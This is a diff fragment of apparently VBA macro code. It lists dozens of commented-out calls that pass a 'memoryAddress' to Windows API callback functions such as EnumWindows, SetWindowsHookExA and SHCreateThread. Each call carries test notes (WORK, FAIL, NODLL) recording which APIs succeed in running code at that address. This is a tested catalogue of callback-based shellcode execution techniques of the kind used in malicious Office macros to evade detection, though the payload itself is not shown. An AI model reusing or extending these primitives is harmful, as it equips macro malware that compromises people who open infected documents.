+'executeResult = shellExecute(zL, memoryAddress, zL) ' WORK EnumThreadWindows
+'executeResult = shellExecute(memoryAddress, zL, zL) ' WORK EnumTimeFormatsA
+'executeResult = shellExecute(memoryAddress, zL, zL) ' WORK EnumTimeFormatsW
+'executeResult = shellExecute(memoryAddress, zL, zL) ' WORK EnumUILanguagesA
+'executeResult = shellExecute(memoryAddress, zL, zL) ' WORK EnumUILanguagesW
+'executeResult = shellExecute(memoryAddress, zL) ' WORK EnumWindowStationsA
+'executeResult = shellExecute(memoryAddress, zL) ' WORK EnumWindowStationsW
+'executeResult = shellExecute(memoryAddress, zL) ' WORK EnumWindows
+'executeResult = shellExecute(processHandle, memoryAddress, zL) ' WORK EnumerateLoadedModules
+'executeResult = shellExecute(processHandle, memoryAddress, zL) ' WORK EnumerateLoadedModulesEx
+'executeResult = shellExecute(processHandle, memoryAddress, zL) ' WORK EnumerateLoadedModulesExW
+'executeResult = shellExecute(moduleHandle, oL, memoryAddress, oL, oL, oL, oL, oL, oL) ' WORK GrayStringA
+'executeResult = shellExecute(moduleHandle, oL, memoryAddress, oL, oL, oL, oL, oL, oL) ' WORK GrayStringW
+'executeResult = shellExecute(zL, memoryAddress, oL, oL, oL) ' WORK NotifyIpInterfaceChange
+'executeResult = shellExecute(memoryAddress, oL, oL, oL) ' WORK NotifyTeredoPortChange
+'executeResult = shellExecute(zL, memoryAddress, oL, oL, oL) ' WORK NotifyUnicastIpAddressChange
+'executeResult = shellExecute(zL, zL, zL, memoryAddress) ' WORK SHCreateThread
+'executeResult = shellExecute(zL, zL, zL, memoryAddress, processHandle) ' WORK SHCreateThreadWithHandle
+'executeResult = shellExecute(windowHandle, zL, zL, zL, memoryAddress, zL) ' WORK SendMessageCallbackA
+'executeResult = shellExecute(windowHandle, zL, zL, zL, memoryAddress, zL) ' WORK SendMessageCallbackW
+'executeResult = shellExecute(zL, oL, moduleHandle, memoryAddress, zL, zL, zL) ' WORK SetWinEventHook (Works only if you trigger event, so possibly calling NotifyWinEvent - didn't get it working outside of debugger so not including)
+'executeResult = shellExecute(zL, memoryAddress, zL, zL) ' WORK SetWindowsHookExA
+'executeResult = shellExecute(zL, memoryAddress, zL, zL) ' WORK SetWindowsHookExW
+
+' ##################
+' FAILED FUNCTIONS #
+' ##################
+
+'executeResult = shellExecute(oL, oL, memoryAddress, oL) ' FAIL AddClusterNode
+'executeResult = shellExecute(zL, zL, memoryAddress, zL) ' NODLL BluetoothRegisterForAuthentication
+'executeResult = shellExecute(oL, oL, oL, oL, oL, oL, oL, oL, oL, memoryAddress, oL) ' FAIL CMTranslateRGBsExt
+'executeResult = shellExecute(zL, memoryAddress, zL) ' FAIL CreateCluster (May work if you pass cluster config)
+'executeResult = shellExecute(oL, oL, windowHandle, memoryAddress, zL) ' FAIL CreateDialogIndirectParamA
+'executeResult = shellExecute(oL, oL, windowHandle, memoryAddress, zL) ' FAIL CreateDialogIndirectParamW
+'executeResult = shellExecute(moduleHandle, oL, windowHandle, memoryAddress, zL) ' FAIL CreateDialogParamA
+'executeResult = shellExecute(moduleHandle, oL, windowHandle, memoryAddress, zL) ' FAIL CreateDialogParamW
+'executeResult = shellExecute(zL, zL, zL, zL, memoryAddress, zL) ' CANTFIND CreatePrintAsyncNotifyChannel
+'executeResult = shellExecute(oL, zL, memoryAddress, zL, oL, oL, oL) ' FAIL CreateTimerQueueTimer
+'executeResult = shellExecute(memoryAddress, zL) ' NODLL DavRegisterAuthCallback
+'executeResult = shellExecute(moduleHandle, memoryAddress, oL, zL) ' FAIL DestroyCluster
+'executeResult = shellExecute(moduleHandle, oL, windowHandle, memoryAddress, oL) ' FAIL DialogBoxParamA
+'executeResult = shellExecute(moduleHandle, oL, windowHandle, memoryAddress, oL) ' FAIL DialogBoxParamW
+'executeResult = shellExecute(moduleHandle, moduleHandle, memoryAddress, oL, oL, oL, oL, oL, oL, oL) ' FAIL DrawStateA
+'executeResult = shellExecute(moduleHandle, moduleHandle, memoryAddress, oL, oL, oL, oL, oL, oL, oL) ' FAIL DrawStateW
+'executeResult = shellExecute(oL, memoryAddress, oL) ' FAIL EnumChildWindows
+'executeResult = shellExecute(oL, oL, memoryAddress, oL, oL) ' FAIL EnumEnhMetaFile
+'executeResult = shellExecute(oL, oL, memoryAddress, oL) ' FAIL EnumFontFamiliesA
+'executeResult = shellExecute(oL, oL, memoryAddress, oL) ' FAIL EnumFontFamiliesW
+'executeResult = shellExecute(oL, oL, memoryAddress, oL, zL) ' FAIL EnumFontFamiliesExA
+'executeResult = shellExecute(oL, oL, memoryAddress, oL, zL) ' FAIL EnumFontFamiliesExW
+'executeResult = shellExecute(oL, oL, memoryAddress, oL) ' FAIL EnumFontsA
+'executeResult = shellExecute(gethandle, memoryAddress, oL) ' FAIL EnumICMProfilesA
+'executeResult = shellExecute(gethandle, memoryAddress, oL) ' FAIL EnumICMProfilesW
+'executeResult = shellExecute(oL, oL, memoryAddress, zL) ' FAIL EnumMetaFile
+'executeResult = shellExecute(zL, oL, memoryAddress, oL) ' FAIL EnumObjects
+'executeResult = shellExecute(windowHandle, oL, oL, memoryAddress, zL) ' FAIL EnumResourceLanguagesA
+'executeResult = shellExecute(windowHandle, oL, oL, memoryAddress, zL) ' FAIL EnumResourceLanguagesW
+'executeResult = shellExecute(windowHandle, oL, oL, memoryAddress, zL, oL, zL) ' FAIL EnumResourceLanguagesExA
+'executeResult = shellExecute(windowHandle, oL, oL, memoryAddress, zL, oL, zL) ' FAIL EnumResourceLanguagesExW
+'rL = 9
+'executeResult = shellExecute(moduleHandle, rL, memoryAddress, zL) ' FAIL EnumResourceNamesA
+'executeResult = shellExecute(zL, oL, memoryAddress, oL) ' FAIL EnumResourceNamesW
+'executeResult = shellExecute(zL, oL, memoryAddress, oL, zL, zL) ' FAIL EnumResourceNamesExA
+'executeResult = shellExecute(zL, oL, memoryAddress, oL, zL, zL) ' FAIL EnumResourceNamesExW
+'executeResult = shellExecute(oL, oL, memoryAddress, zL) ' FAIL EventRegister
+'executeResult = shellExecute(processHandle, memoryAddress, oL, oL, oL) ' FAIL GetApplicationRecoveryCallback
+'executeResult = shellExecute(oL, oL, oL, oL, memoryAddress, oL) ' FAIL LineDDA
+'executeResult = shellExecute(zL, moduleHandle, memoryAddress, oL, oL) ' FAIL NotifyStableUnicastIpAddressTable
+'executeResult = shellExecute(oL, memoryAddress, oL) ' FAIL PerfStartProvider
+'executeResult = shellExecute(memoryAddress, processHandle, oL) ' FAIL ReadEncryptedFileRaw (Might work with some time)
+'executeResult = shellExecute(memoryAddress, oL, zL, zL) ' FAIL RegisterApplicationRecoveryCallback
+'executeResult = shellExecute(zL, zL, zL, zL, memoryAddress, zL) ' NOFUNC RegisterForPrintAsyncNotifications
+'executeResult = shellExecute(processHandle, memoryAddress, processHandle) ' FAIL RegisterServiceCtrlHandlerExA
+'executeResult = shellExecute(processHandle, memoryAddress, processHandle) ' FAIL RegisterServiceCtrlHandlerExW
+'rL = 4
+'executeResult = shellExecute(moduleHandle, moduleHandle, memoryAddress, oL, oL, rL) ' FAIL RegisterWaitForSingleObject (Might work with some time)
+'executeResult = shellExecute(oL, oL, memoryAddress, oL, oL, oL, oL) ' FAIL SetTimerQueueTimer (Might work with some time)
+'executeResult = shellExecute(processHandle, oL, zL, zL, memoryAddress, zL) ' ERRBADCALL SymEnumLines
+'executeResult = shellExecute(memoryAddress, oL) ' ERRBADCALL SymEnumProcesses
+'executeResult = shellExecute(processHandle, oL, zL, zL, zL, zL, memoryAddress, zL) ' ERRBADCALL SymEnumSourceLines
+'executeResult = shellExecute(processHandle, oL, oL, memoryAddress, oL) ' ERRBADCALL SymEnumSymbols
+'executeResult = shellExecute(oL, oL, zL, oL, oL, zL, oL, zL, zL, memoryAddress, oL) ' FAIL TranslateBitmapBits
+'executeResult = shellExecute(zL, memoryAddress, zL, zL) ' NODLL WPUQueryBlockingCallback
+'executeResult = shellExecute(zL, zL, zL, zL, zL, zL, memoryAddress, zL, zL) ' NODLL WdsCliTransferFile
+'executeResult = shellExecute(moduleHandle, zL, zL, memoryAddress, oL, moduleHandle, oL) ' FAIL WlanRegisterNotification
+'executeResult = shellExecute(memoryAddress, memoryAddress, memoryAddress) ' FAIL WriteEncryptedFileRaw
+'executeResult = shellExecute(moduleHandle, memoryAddress, zL, zL) ' FAIL WsPullBytes
+'executeResult = shellExecute(oL, memoryAddress, oL) ' FAIL mciSetYieldProc
+'executeResult = shellExecute(moduleHandle, oL, memoryAddress, oL, zL) ' FAIL midiInOpen
+
+Stop
+
+End Sub
+
